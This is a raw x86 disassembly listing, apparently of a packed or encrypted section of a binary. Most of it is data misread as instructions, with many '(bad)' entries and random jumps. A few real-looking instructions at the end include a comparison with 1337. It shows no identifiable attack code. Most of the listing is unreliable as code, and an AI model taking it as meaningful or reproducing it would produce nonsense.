  414b38:	jge    0x414b13
  414b3a:	and    bl,0x86
  414b3d:	sahf   
  414b3e:	mov    edx,0xac1a45df
  414b43:	jns    0x414b48
  414b45:	int3   
  414b46:	iret   
  414b47:	push   cs
  414b48:	rcl    DWORD PTR [esi],cl
  414b4a:	cmp    al,BYTE PTR fs:[ecx-0x23b590bd]
  414b51:	and    bh,dh
  414b53:	xchg   ebp,eax
  414b54:	dec    edi
  414b55:	ret    
  414b56:	xchg   ebx,eax
  414b57:	fisttp DWORD PTR [ebx-0x8]
  414b5a:	pop    ebx
  414b5b:	xchg   DWORD PTR [edx],edx
  414b5d:	(bad)  
  414b5e:	repnz (bad) 
  414b60:	mov    bl,0x63
  414b62:	add    bl,dh
  414b64:	in     al,dx
  414b65:	adc    DWORD PTR [edx],eax
  414b67:	cmp    ch,ch
  414b69:	clc    
  414b6a:	sbb    eax,0x4e223bd7
  414b6f:	ins    DWORD PTR es:[edi],dx
  414b70:	mov    ds:0xcd0846a9,eax
  414b75:	sbb    edx,esi
  414b77:	out    0x72,al
  414b79:	push   eax
  414b7a:	les    edx,FWORD PTR ds:0xc5c6aedb
  414b80:	or     DWORD PTR ds:0x399702c5,esi
  414b86:	xchg   edx,eax
  414b87:	pop    es
  414b88:	push   esi
  414b89:	mov    BYTE PTR [ecx],cl
  414b8b:	out    dx,eax
  414b8c:	sub    ebp,DWORD PTR [edi]
  414b8e:	cmc    
  414b8f:	and    edi,DWORD PTR [eax-0x74ea64d3]
  414b95:	mov    ch,0xa8
  414b97:	or     al,0xc8
  414b99:	jmp    0xeb90:0x90f6a47e
  414ba0:	add    esi,DWORD PTR [ecx]
  414ba2:	mov    ch,dh
  414ba4:	pusha  
  414ba5:	retf   0x789d
  414ba8:	jp     0x414b9a
  414baa:	sbb    BYTE PTR [ebp+0xc257989],bh
  414bb0:	scas   eax,DWORD PTR es:[edi]
  414bb1:	inc    ecx
  414bb2:	rol    bh,1
  414bb4:	repnz aam 0xf5
  414bb7:	xchg   ecx,eax
  414bb8:	push   cs
  414bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bba:	les    edi,FWORD PTR [ecx-0x4c]
  414bbd:	sub    eax,0xe55b9e2d
  414bc2:	std    
  414bc3:	jb     0x414b94
  414bc5:	push   ebp
  414bc6:	in     eax,0x37
  414bc8:	pop    esi
  414bc9:	adc    DWORD PTR [ecx-0x38c5c173],esp
  414bcf:	mov    ebp,0xec1c3290
  414bd4:	outs   dx,BYTE PTR ds:[esi]
  414bd5:	add    eax,DWORD PTR [edx+ebx*2+0x43]
  414bd9:	push   esp
  414bda:	call   0x654da2db
  414bdf:	pop    ebx
  414be0:	pop    ebx
  414be1:	or     al,0x67
  414be3:	or     ebx,DWORD PTR [esi]
  414be5:	push   cs
  414be6:	jmp    0xcc3e8544
  414beb:	sbb    cl,BYTE PTR [ebp+0x2f]
  414bee:	mov    dl,0x36
  414bf0:	push   DWORD PTR [edi-0x4d]
  414bf3:	dec    edx
  414bf4:	mov    edx,DWORD PTR [edx]
  414bf6:	push   ss
  414bf7:	outs   dx,DWORD PTR ds:[esi]
  414bf8:	and    al,bh
  414bfa:	pop    ss
  414bfb:	mov    bl,BYTE PTR [esp+esi*1]
  414bfe:	and    al,al
  414c00:	jge    0x414b90
  414c02:	and    al,0x1e
  414c04:	jno    0x414c77
  414c06:	mov    ds:0xf9d08138,eax
  414c0b:	bound  esp,QWORD PTR ds:0xf801f4c1
  414c11:	mov    eax,ds:0xb904a341
  414c16:	mov    ecx,?
  414c18:	and    ah,BYTE PTR [ecx+0x723972d2]
  414c1e:	pop    ss
  414c1f:	outs   dx,BYTE PTR ds:[esi]
  414c20:	sbb    al,0x3b
  414c22:	popa   
  414c23:	sub    BYTE PTR [ecx+0x22],bl
  414c26:	in     al,0x77
  414c28:	cld    
  414c29:	vpshaq xmm2,xmm4,xmm6
  414c2e:	inc    edi
  414c2f:	cmc    
  414c30:	mov    esi,0x164df5d3
  414c35:	aas    
  414c36:	sub    BYTE PTR [eax-0x33],dl
  414c39:	stos   DWORD PTR es:[edi],eax
  414c3a:	pop    ebx
  414c3b:	lahf   
  414c3c:	add    eax,0x464d770b
  414c41:	inc    esi
  414c42:	test   ebx,edi
  414c44:	mov    dh,0x3b
  414c46:	in     eax,dx
  414c47:	dec    eax
  414c48:	or     BYTE PTR [edi-0x6f3232fa],0x43
  414c4f:	dec    edx
  414c50:	xchg   ecx,eax
  414c51:	dec    edi
  414c52:	add    DWORD PTR [ebp-0xfd60b58],ebp
  414c58:	push   ecx
  414c59:	(bad)  
  414c5a:	stos   DWORD PTR es:[edi],eax
  414c5b:	sub    BYTE PTR [ecx-0x16],ah
  414c5e:	fwait
  414c5f:	sbb    al,0xf0
  414c61:	nop
  414c62:	dec    eax
  414c63:	imul   ebp,DWORD PTR [edi],0x65898b42
  414c69:	mov    WORD PTR [ebp+edx*8+0x3],fs
  414c6d:	enter  0xffab,0xf5
  414c71:	mov    eax,ds:0x7cccdd5f
  414c76:	xchg   edx,eax
  414c77:	ror    BYTE PTR [ebx-0x3ecba20f],0xf0
  414c7e:	and    dl,BYTE PTR [ebp+eax*4+0x5fab2e93]
  414c85:	mov    BYTE PTR [ecx-0x57],dh
  414c88:	mov    ebx,0xf8170150
  414c8d:	fbstp  TBYTE PTR [eax-0x4c67b73]
  414c93:	(bad)  
  414c95:	mov    al,ds:0x106ffdcc
  414c9a:	cld    
  414c9b:	call   FWORD PTR [eax]
  414c9d:	popf   
  414c9e:	cdq    
  414c9f:	lahf   
  414ca0:	ror    ebx,1
  414ca2:	cwde   
  414ca3:	xor    BYTE PTR [esi],cl
  414ca5:	pop    ds
  414ca6:	push   0xfa24c21a
  414cab:	ins    BYTE PTR es:[edi],dx
  414cac:	fadd   st(4),st
  414cae:	das    
  414caf:	inc    ebp
  414cb0:	fisub  WORD PTR ds:0x7a70ad4b
  414cb6:	sbb    al,0xf9
  414cb8:	add    ecx,esp
  414cba:	mov    WORD PTR [ebx-0x5803ebf6],ss
  414cc0:	and    al,0xfc
  414cc2:	and    eax,0x115e3b28
  414cc7:	add    al,BYTE PTR [eax]
  414cc9:	call   0x4af617e3
  414cce:	inc    ebx
  414ccf:	xchg   DWORD PTR [edx-0x78],edx
  414cd2:	jp     0x414d39
  414cd4:	xchg   ebx,eax
  414cd5:	outs   dx,DWORD PTR ds:[esi]
  414cd6:	and    DWORD PTR [edx],0xdc3485bf
  414cdc:	mov    ecx,ecx
  414cde:	ins    BYTE PTR es:[edi],dx
  414cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce0:	pop    edx
  414ce1:	sub    al,0x53
  414ce3:	xor    BYTE PTR [edx+ecx*1],dh
  414ce6:	push   ds
  414ce7:	(bad)  
  414ce8:	xchg   esi,eax
  414ce9:	(bad)  
  414cea:	xor    eax,0x8cfec143
  414cef:	add    DWORD PTR ds:0x5c3fbfc5,0x2045744a
  414cf9:	xchg   ecx,eax
  414cfa:	shr    DWORD PTR [eax-0x13e045ea],cl
  414d00:	xchg   esi,eax
  414d01:	in     eax,dx
  414d02:	(bad)  
  414d03:	repnz aad 0x80
  414d06:	sub    eax,0x3dd3994c
  414d0b:	push   0xffffff96
  414d0d:	ins    BYTE PTR es:[edi],dx
  414d0e:	xor    ah,BYTE PTR [edx-0xe73eecd]
  414d14:	push   0x7e
  414d16:	jae    0x414cd6
  414d18:	add    DWORD PTR [esp+esi*8-0x175a9fd5],esi
  414d1f:	jle    0x414cba
  414d21:	popf   
  414d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d23:	and    BYTE PTR [ecx-0x58],dl
  414d26:	mov    bl,0xa8
  414d28:	shr    BYTE PTR [ebx+eiz*1-0x661a337],cl
  414d2f:	jecxz  0x414d20
  414d31:	dec    esp
  414d32:	(bad)  [eax+0x486ff056]
  414d38:	or     DWORD PTR [ebx+0x67],eax
  414d3b:	push   ecx
  414d3c:	sub    bl,BYTE PTR [ebp+eax*8+0x2d392b99]
  414d43:	je     0x414cc5
  414d45:	das    
  414d46:	rcr    DWORD PTR [eax],1
  414d48:	xchg   edi,eax
  414d49:	pop    ss
  414d4a:	sub    ecx,DWORD PTR [ecx]
  414d4c:	mov    dl,0x6f
  414d4e:	loopne 0x414d77
  414d50:	xchg   edx,eax
  414d51:	and    BYTE PTR [esi],0x9a
  414d54:	dec    ebx
  414d55:	call   0x1583ba9f
  414d5a:	shl    eax,cl
  414d5c:	aad    0xcd
  414d5e:	or     eax,0x3c8f2fb5
  414d63:	nop
  414d64:	pop    edi
  414d65:	and    al,0xb3
  414d67:	xchg   esi,eax
  414d68:	and    DWORD PTR [esi+eiz*2],esi
  414d6b:	out    0x66,al
  414d6d:	push   ebp
  414d6e:	stos   BYTE PTR es:[edi],al
  414d6f:	jmp    0x5d70a69f
  414d74:	and    al,0xe8
  414d76:	push   esp
  414d77:	std    
  414d78:	jo     0x414dab
  414d7a:	cmp    ecx,esp
  414d7c:	frstor [esi]
  414d7e:	test   al,0x80
  414d80:	pusha  
  414d81:	and    DWORD PTR [esi-0x7e7cdcd7],edx
  414d87:	and    eax,0x38971639
  414d8c:	aas    
  414d8d:	or     al,BYTE PTR [ebx-0x15]
  414d90:	or     esp,DWORD PTR [esi]
  414d92:	jno    0x414dc0
  414d94:	hlt    
  414d95:	repnz add ah,bl
  414d98:	rcr    BYTE PTR [ebx-0x55],cl
  414d9b:	icebp  
  414d9c:	(bad)
  414d9f:	push   edx
  414da0:	inc    eax
  414da1:	inc    ebp
  414da2:	jne    0x414dc7
  414da4:	pop    ecx
  414da5:	lds    edx,FWORD PTR [ebx-0xe]
  414da8:	(bad)  
  414da9:	lock aam 0x53
  414dac:	xor    esi,DWORD PTR [edx+0x62]
  414daf:	jl     0x414df8
  414db1:	mov    ds:0xac733320,eax
  414db6:	inc    BYTE PTR [edx-0x4299142d]
  414dbc:	mov    cl,0x60
  414dbe:	retf   
  414dbf:	out    dx,al
  414dc0:	out    dx,al
  414dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dc2:	les    edx,FWORD PTR ds:0xcc36fd20
  414dc8:	outs   dx,BYTE PTR ds:[esi]
  414dc9:	or     eax,0xb83542b
  414dce:	xchg   ecx,eax
  414dcf:	fisub  DWORD PTR [edx-0x4a0a4b3d]
  414dd6:	ret    0x21bc
  414dd9:	pushf  
  414dda:	dec    ecx
  414ddb:	jg     0x414e14
  414ddd:	lock sahf 
  414ddf:	jns    0x414dcf
  414de1:	sbb    DWORD PTR [edx],ebx
  414de3:	dec    ebx
  414de4:	or     al,0x5e
  414de6:	jg     0x414d81
  414de8:	imul   ebx,DWORD PTR [esi],0x9e94dc3b
  414dee:	and    dl,bh
  414df0:	cmc    
  414df1:	ins    DWORD PTR es:[edi],dx
  414df2:	jl     0x414d79
  414df4:	loopne 0x414e1e
  414df6:	test   edi,0xa22b03e6
  414dfc:	jnp    0x414d8d
  414dfe:	cli    
  414dff:	mov    esp,0xa76d3437
  414e04:	cdq    
  414e05:	mov    ah,0x1
  414e07:	sbb    ebp,DWORD PTR [edx]
  414e09:	fisub  DWORD PTR [edi-0x282a56d8]
  414e0f:	cmp    bl,al
  414e11:	push   esi
  414e12:	fbstp  TBYTE PTR [ebp+ecx*2-0x3e]
  414e16:	fwait
  414e17:	aaa    
  414e18:	pop    edi
  414e19:	icebp  
  414e1a:	(bad)  
  414e1b:	cmp    edi,esp
  414e1d:	add    BYTE PTR [esi-0x4a77b583],ch
  414e23:	sub    BYTE PTR [edi+0x5817caf5],al
  414e29:	out    dx,eax
  414e2a:	push   ds
  414e2b:	xchg   edi,eax
  414e2c:	mov    ecx,0xac108c5d
  414e31:	or     BYTE PTR [esi-0x40bad557],bh
  414e37:	xchg   ebp,eax
  414e38:	pop    esi
  414e39:	mov    dl,0x98
  414e3b:	stc    
  414e3c:	push   eax
  414e3d:	loopne 0x414ea9
  414e3f:	add    al,0x5b
  414e41:	jbe    0x414e3a
  414e43:	(bad)
  414e46:	jb     0x414e81
  414e48:	jg     0x414e68
  414e4a:	cmc    
  414e4b:	scas   al,BYTE PTR es:[edi]
  414e4c:	ja     0x414e91
  414e4e:	inc    edi
  414e4f:	cmp    ebp,esp
  414e51:	jmp    0x414e5a
  414e53:	mov    BYTE PTR [esi],dl
  414e55:	jmp    0x33ad0b7e
  414e5a:	(bad)  
  414e5c:	push   0xb51f83c7
  414e61:	std    
  414e62:	xchg   esp,eax
  414e63:	cmc    
  414e64:	sub    eax,0x262951c
  414e69:	test   DWORD PTR [edi-0x35f0194c],edi
  414e6f:	mov    ecx,0xcaf45994
  414e74:	push   0x5d
  414e76:	jmp    0x70d0:0xa1cd3384
  414e7d:	pusha  
  414e7e:	xor    eax,0x38afde81
  414e83:	sbb    ah,BYTE PTR [esi+0x0]
  414e86:	rcl    DWORD PTR [ebp-0x61],cl
  414e89:	fld    TBYTE PTR [eax-0x6a29b677]
  414e8f:	(bad)  
  414e90:	fistp  WORD PTR [edi]
  414e92:	adc    eax,0x3d57a31b
  414e97:	or     eax,0x366dbc26
  414e9c:	fwait
  414e9d:	lock in eax,0xfd
  414ea0:	or     DWORD PTR [eiz*2+0x2835e31c],eax
  414ea7:	sbb    eax,0x8b881f28
  414eac:	popa   
  414ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eae:	push   ebx
  414eaf:	enter  0xc71e,0x5
  414eb3:	repz adc ebx,DWORD PTR ds:0x7149e474
  414eba:	stos   DWORD PTR es:[edi],eax
  414ebb:	(bad)  
  414ebc:	outs   dx,BYTE PTR ds:[esi]
  414ebd:	jp     0x414eba
  414ebf:	dec    ebp
  414ec0:	ret    0xe313
  414ec3:	adc    al,0x16
  414ec5:	mov    dh,0x44
  414ec7:	xchg   ebp,eax
  414ec8:	xrelease xchg BYTE PTR [esi-0x72],bh
  414ecc:	sub    BYTE PTR [esi+ebx*4+0x3f],bl
  414ed0:	pop    es
  414ed1:	sub    esp,DWORD PTR [ebp+0x273c42af]
  414ed7:	popfw  
  414ed9:	aam    0xae
  414edb:	add    DWORD PTR [ecx+ebp*1-0x32174e94],edi
  414ee2:	xor    ebx,ebp
  414ee4:	out    0x12,eax
  414ee6:	pop    edx
  414ee7:	pop    ds
  414ee8:	add    edx,DWORD PTR [edx]
  414eea:	mov    bl,0xfb
  414eec:	mov    ebp,0x1fa4c709
  414ef1:	mov    WORD PTR [ebp-0x1f3ac338],gs
  414ef7:	pop    esp
  414ef8:	xchg   ebp,eax
  414ef9:	ja     0x414f39
  414efb:	xor    DWORD PTR [edi],ebx
  414efd:	mov    ds:0x31a5dd12,eax
  414f02:	call   0x918fad0d
  414f07:	push   ecx
  414f08:	int    0xa5
  414f0a:	test   bh,ah
  414f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f0d:	inc    ecx
  414f0e:	mov    dl,BYTE PTR [ecx+0x4740c488]
  414f14:	test   eax,0x45cec7af
  414f19:	inc    ecx
  414f1a:	cwde   
  414f1b:	dec    edx
  414f1c:	ror    BYTE PTR [edi-0x3c1267db],cl
  414f22:	mov    eax,ds:0x4802cf69
  414f27:	mov    ch,0x1e
  414f29:	test   BYTE PTR [edi],0xa6
  414f2c:	fstp   TBYTE PTR [ebx+0x74]
  414f2f:	cld    
  414f30:	out    0x54,eax
  414f32:	fisub  WORD PTR [ebx]
  414f34:	or     al,0x49
  414f37:	test   DWORD PTR [edx+0x2],edx
  414f3a:	and    BYTE PTR [edx+edx*2-0x1840b366],dh
  414f41:	or     al,0x42
  414f43:	mov    ebp,0xc65df2a2
  414f48:	scas   eax,DWORD PTR es:[edi]
  414f49:	dec    ebx
  414f4a:	push   ss
  414f4b:	retf   
  414f4c:	xchg   esi,edi
  414f4e:	out    dx,al
  414f4f:	inc    esp
  414f50:	cmp    eax,0x521403b8
  414f55:	nop
  414f56:	add    ch,dl
  414f58:	repnz or bl,BYTE PTR [ecx+0x5a]
  414f5c:	sbb    ah,bl
  414f5e:	shr    BYTE PTR [edi-0x69b9cba0],0xd0
  414f65:	jmp    0x195aa6d7
  414f6a:	or     al,0x70
  414f6c:	iret   
  414f6d:	out    0x6c,eax
  414f6f:	shr    DWORD PTR [edi],0x5b
  414f72:	nop
  414f73:	or     ebx,esi
  414f75:	xor    eax,0x3c96720f
  414f7a:	dec    edi
  414f7b:	mov    eax,0xb95cd2ed
  414f80:	sub    eax,0x439c057
  414f85:	pop    ebp
  414f86:	push   ebp
  414f87:	mov    ah,0x7e
  414f89:	xor    bh,dh
  414f8b:	das    
  414f8c:	add    eax,0x74cc940a
  414f91:	push   ebx
  414f92:	mov    DWORD PTR [ecx],ebp
  414f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f95:	aaa    
  414f96:	cmp    eax,esi
  414f98:	dec    edi
  414f99:	inc    ebp
  414f9a:	ror    BYTE PTR [ebx],1
  414f9c:	shl    BYTE PTR [eax+0x851f56b],1
  414fa2:	(bad)  
  414fa3:	ins    DWORD PTR es:[edi],dx
  414fa4:	adc    dl,ch
  414fa6:	retf   0xf245
  414fa9:	je     0x415003
  414fab:	ja     0x414fb3
  414fad:	mov    dl,0xb1
  414faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb0:	(bad)  
  414fb1:	xor    bl,ch
  414fb3:	mov    esi,0x30ad792
  414fb8:	push   ebx
  414fb9:	shr    DWORD PTR [edi+0x22fb812],1
  414fbf:	fcom   DWORD PTR [eax-0x52]
  414fc2:	rcr    BYTE PTR [eax],1
  414fc4:	pop    edi
  414fc5:	hlt    
  414fc6:	sar    edi,1
  414fc8:	stos   BYTE PTR es:[edi],al
  414fc9:	in     al,dx
  414fca:	add    DWORD PTR [edi+0xd0a9f94],0xffffffae
  414fd1:	rcl    DWORD PTR [ecx],cl
  414fd3:	dec    edi
  414fd4:	add    DWORD PTR [eax],ebx
  414fd6:	int3   
  414fd7:	push   0xffffffb4
  414fd9:	pop    ebp
  414fda:	(bad)  
  414fdb:	dec    esp
  414fdc:	xchg   ebx,eax
  414fdd:	mov    dh,0xac
  414fdf:	mov    esi,0x1f8485f2
  414fe4:	stc    
  414fe5:	xor    ecx,DWORD PTR [esi]
  414fe7:	jl     0x415061
  414fe9:	mov    ah,0x1d
  414feb:	ss xchg edx,eax
  414fed:	add    al,BYTE PTR [esi-0x32458cde]
  414ff3:	icebp  
  414ff4:	icebp  
  414ff5:	icebp  
  414ff6:	mov    ds,WORD PTR [esi-0x18]
  414ff9:	mov    bl,0x5f
  414ffb:	fidivr DWORD PTR ds:0x990db95f
  415001:	loope  0x414fbe
  415003:	sti    
  415004:	xchg   DWORD PTR [ebp-0x57],esi
  415007:	cdq    
  415008:	push   ebx
  415009:	xor    BYTE PTR [edi-0x3a93aed1],dh
  41500f:	or     bl,dl
  415011:	sub    al,0xfa
  415013:	popa   
  415014:	sub    bl,ah
  415016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415017:	ins    BYTE PTR es:[edi],dx
  415018:	aas    
  415019:	(bad)  
  41501a:	push   edx
  41501b:	js     0x415035
  41501d:	enter  0x30b1,0x23
  415021:	xor    dh,BYTE PTR [edi-0x20cf6abf]
  415027:	mov    dh,0x12
  415029:	mov    dl,0x0
  41502b:	jmp    0x6047134e
  415030:	xor    edx,ecx
  415032:	into   
  415033:	adc    BYTE PTR [edi+0x52],0x4b
  415037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415038:	adc    BYTE PTR [edx],al
  41503a:	adc    bh,dl
  41503c:	pop    edi
  41503d:	push   eax
  41503e:	shl    BYTE PTR [eax+0x564d5e90],cl
  415044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415045:	cld    
  415046:	xchg   DWORD PTR [ecx-0x7a],edi
  415049:	call   0xd037:0x168a38a9
  415050:	xchg   edi,eax
  415051:	push   ds
  415052:	int3   
  415053:	shl    ah,0x95
  415056:	les    edi,FWORD PTR [edx-0x33]
  415059:	sbb    bl,0x1a
  41505c:	mov    ds:0xf84a7f1e,eax
  415061:	mov    BYTE PTR [eax+edi*8+0x3a0b4103],ch
  415068:	nop
  415069:	cdq    
  41506a:	repz dec edi
  41506c:	mov    ebp,0x9e908006
  415071:	pop    edx
  415072:	xor    eax,0x474e4103
  415077:	mov    BYTE PTR [esi+0xd],bh
  41507a:	in     eax,0xdc
  41507c:	xchg   edx,eax
  41507d:	mov    bl,0x9d
  41507f:	repz dec edx
  415081:	(bad)  
  415083:	pushf  
  415084:	push   0xee5febbf
  415089:	je     0x41501d
  41508b:	xlat   BYTE PTR ds:[ebx]
  41508c:	add    BYTE PTR [ebx+0x43],bh
  41508f:	fimul  WORD PTR [esi+0x2995f020]
  415095:	das    
  415096:	jb     0x4150d4
  415098:	sub    al,0x1c
  41509a:	inc    edx
  41509b:	into   
  41509c:	cmp    esp,ecx
  41509e:	adc    eax,ebx
  4150a0:	and    cl,BYTE PTR [ecx]
  4150a2:	stc    
  4150a3:	xchg   edi,eax
  4150a4:	lea    eax,[esi]
  4150a6:	mov    DWORD PTR [ebp+0x25],esp
  4150a9:	dec    esp
  4150aa:	mov    esi,0xc789404f
  4150af:	jae    0x41510f
  4150b1:	cld    
  4150b2:	aam    0x28
  4150b4:	push   edx
  4150b5:	setae  bl
  4150b8:	mov    eax,0x36d8b428
  4150bd:	aas    
  4150be:	xor    bl,BYTE PTR [edx-0x320f58d0]
  4150c4:	dec    esp
  4150c5:	sbb    DWORD PTR [esi],ecx
  4150c7:	fnsave [edx]
  4150c9:	xor    edi,DWORD PTR [edx]
  4150cb:	imul   sp
  4150ce:	mov    ds:0x32e7bb36,eax
  4150d3:	push   ecx
  4150d4:	jnp    0x415131
  4150d6:	mov    al,0x42
  4150d8:	inc    eax
  4150d9:	jmp    0x4150a1
  4150db:	nop
  4150dc:	xchg   edi,eax
  4150dd:	lea    eax,[ecx+0x65e0e2e8]
  4150e3:	xchg   ecx,eax
  4150e4:	xor    eax,0x77c067b4
  4150e9:	outs   dx,BYTE PTR ds:[esi]
  4150ea:	ins    DWORD PTR es:[edi],dx
  4150eb:	and    dh,BYTE PTR [ecx+0x4a]
  4150ee:	adc    cl,BYTE PTR [edx-0x27]
  4150f1:	lods   eax,DWORD PTR ds:[esi]
  4150f2:	jbe    0x41507f
  4150f4:	or     dl,dh
  4150f6:	dec    edx
  4150f7:	sti    
  4150f8:	xchg   ecx,eax
  4150f9:	pop    edx
  4150fa:	sbb    eax,0xf3b8e6e8
  4150ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415100:	icebp  
  415101:	push   DWORD PTR [eax-0x50159768]
  415107:	sub    BYTE PTR [ebx+0x6ca99366],0xbf
  41510e:	pop    ebp
  41510f:	xchg   ebx,eax
  415110:	out    dx,eax
  415111:	ins    DWORD PTR es:[edi],dx
  415112:	retf   0x9558
  415115:	mov    esp,DWORD PTR [ebx]
  415117:	mov    esi,0x813e6431
  41511c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41511d:	sbb    cl,bh
  41511f:	dec    edx
  415120:	stos   BYTE PTR es:[edi],al
  415121:	cmc    
  415122:	push   edi
  415123:	icebp  
  415124:	(bad)  
  415125:	mov    gs,WORD PTR ds:[esi]
  415128:	sub    al,0xd2
  41512a:	dec    esp
  41512b:	xor    DWORD PTR [eax-0x48],edx
  41512e:	xor    eax,0x8e65b5d9
  415133:	adc    DWORD PTR [esi+0x3796db5b],esi
  415139:	ds push es
  41513b:	jmp    0xaec28232
  415140:	sub    bh,ch
  415142:	pop    ss
  415143:	test   eax,0x97671c16
  415148:	xchg   esp,eax
  415149:	xchg   ebx,eax
  41514a:	pop    edi
  41514b:	iret   
  41514c:	es inc esi
  41514e:	mov    eax,ebp
  415150:	and    dl,BYTE PTR [ebp+0x71]
  415153:	xor    eax,0x48a5e7f8
  415158:	pusha  
  415159:	push   edx
  41515a:	cmp    bh,BYTE PTR [eax-0x8]
  41515d:	add    eax,0x90009c7e
  415162:	dec    esp
  415163:	jmp    0x42fee142
  415168:	sub    BYTE PTR ds:0x651e2cef,0x4e
  41516f:	sbb    edx,ebx
  415171:	mov    ah,0x3b
  415173:	mov    cl,0xab
  415175:	add    al,0xa8
  415177:	jno    0x415167
  415179:	inc    ecx
  41517a:	adc    al,0xf1
  41517c:	pop    esp
  41517d:	dec    esi
  41517e:	pop    edx
  41517f:	mov    ds:0xc3e625ec,eax
  415184:	idiv   al
  415186:	and    eax,0x842e8f78
  41518b:	xchg   ebp,eax
  41518c:	loope  0x4151d7
  41518e:	xchg   DWORD PTR [edx+0x51],edx
  415191:	push   ss
  415192:	(bad)  
  415193:	jae    0x415175
  415195:	mov    DWORD PTR [edi],edi
  415197:	scas   al,BYTE PTR es:[edi]
  415198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415199:	rcr    BYTE PTR ds:0x15a179d2,0x82
  4151a0:	jbe    0x415221
  4151a2:	mov    ebp,DWORD PTR [edi+0x5a]
  4151a5:	push   0xa8c7bf8
  4151aa:	and    eax,0xe64d608
  4151af:	sbb    eax,0xbebbe378
  4151b4:	push   ebp
  4151b5:	scas   eax,DWORD PTR es:[edi]
  4151b6:	push   ebx
  4151b7:	cmp    al,0xd6
  4151b9:	mov    ds:0x2b0bc61d,eax
  4151be:	pop    ebx
  4151bf:	jbe    0x4151b8
  4151c1:	ds adc ch,bh
  4151c4:	iret   
  4151c5:	xchg   ebp,eax
  4151c6:	in     eax,dx
  4151c7:	push   edx
  4151c8:	mov    eax,ds:0x96887e09
  4151cd:	and    bl,bl
  4151cf:	test   eax,0xe554dd38
  4151d4:	sub    BYTE PTR [ecx+0x1b],ch
  4151d7:	fisttp WORD PTR [ecx]
  4151d9:	pop    ds
  4151da:	mov    ecx,0xa607ed19
  4151df:	sub    esi,esi
  4151e1:	cdq    
  4151e2:	xor    DWORD PTR [ebp+0x66],0xffd89386
  4151e9:	xchg   dl,bl
  4151eb:	dec    ebx
  4151ec:	jns    0x4151aa
  4151ee:	aas    
  4151ef:	(bad)  [ebp-0x2cfab020]
  4151f5:	stc    
  4151f6:	popf   
  4151f7:	ins    DWORD PTR es:[edi],dx
  4151f8:	jg     0x415224
  4151fa:	mov    eax,0xa9a767a3
  4151ff:	loopne 0x41522c
  415201:	mov    esi,0x6f65323
  415206:	pop    esp
  415207:	and    bh,BYTE PTR [ebx]
  415209:	mov    edi,0x504050ec
  41520e:	and    DWORD PTR [ecx+0x21],esi
  415211:	mov    ds:0xd6de00b8,eax
  415216:	shl    BYTE PTR [eax+0x2452c8d7],cl
  41521c:	loope  0x415294
  41521e:	int    0x27
  415220:	push   edx
  415221:	lods   al,BYTE PTR ds:[esi]
  415222:	and    al,0x80
  415224:	xor    al,0x58
  415226:	push   esi
  415227:	cld    
  415228:	lea    esi,[edi+0x391c2e9]
  41522e:	mov    cl,0xe1
  415230:	push   ds
  415231:	mov    al,ds:0xb0d690f8
  415236:	xor    BYTE PTR ds:0x76ecf72c,ah
  41523c:	push   esp
  41523d:	sub    DWORD PTR [ebp+0x6e],edi
  415240:	lea    eax,[eax]
  415242:	sbb    edx,ebp
  415244:	mov    esp,0x6a1b082
  415249:	adc    eax,0x1d
  41524c:	ret    0xa6f3
  41524f:	inc    sp
  415251:	pop    ss
  415252:	xchg   ebx,eax
  415253:	fwait
  415254:	(bad)  
  415255:	(bad)  
  415256:	jmp    0xadfaf21a
  41525b:	or     eax,0x447490e8
  415260:	fadd   st,st(4)
  415262:	jnp    0x415255
  415264:	je     0x415266
  415266:	adc    al,0xa8
  415268:	ins    BYTE PTR es:[edi],dx
  415269:	sahf   
  41526a:	in     eax,0xfc
  41526c:	sahf   
  41526d:	adc    ebp,esp
  41526f:	out    0x8a,al
  415271:	mov    cl,0xfc
  415273:	cmp    eax,DWORD PTR [ebx+0x5ac87276]
  415279:	retf   
  41527a:	xlat   BYTE PTR ds:[ebx]
  41527b:	cmp    DWORD PTR [esi],ebx
  41527d:	and    al,0x76
  41527f:	pop    ebp
  415280:	jnp    0x415208
  415282:	push   ecx
  415283:	mov    dh,al
  415285:	or     al,0xa5
  415287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415288:	jecxz  0x41529b
  41528a:	inc    ecx
  41528b:	fdivr  st,st(3)
  41528d:	adc    ah,dh
  41528f:	leave  
  415290:	sbb    cl,ch
  415292:	xchg   edi,eax
  415293:	add    ebx,esi
  415295:	push   es
  415296:	cmp    eax,DWORD PTR [ecx-0x2ac432a1]
  41529c:	xor    eax,0xdf9de244
  4152a1:	(bad)  
  4152a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152a3:	imul   bl
  4152a5:	add    al,0x64
  4152a7:	add    ah,BYTE PTR ds:0xfab850fb
  4152ad:	xor    BYTE PTR [ecx-0x5ab61197],bh
  4152b3:	dec    ecx
  4152b4:	mov    ebp,0xa602c7bb
  4152b9:	add    DWORD PTR [edx+0x7d],ebx
  4152bc:	enter  0x5821,0x84
  4152c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c1:	sbb    eax,0x75a4639e
  4152c6:	xor    esp,0x21481cfe
  4152cc:	in     al,dx
  4152cd:	dec    esi
  4152ce:	sub    eax,0x2cfb7001
  4152d3:	jle    0x4152f9
  4152d5:	push   edx
  4152d6:	call   DWORD PTR ds:0x417014
  4152dc:	mov    DWORD PTR [ebp-0x2c],eax
  4152df:	movzx  eax,WORD PTR [ebp-0x2c]
  4152e3:	cmp    eax,0x539
  4152e8:	jne    0x415319
  4152ea:	mov    DWORD PTR [ebp-0x14],0xe0d
  4152f1:	lea    ecx,[ebp-0x28]
  4152f4:	push   ecx
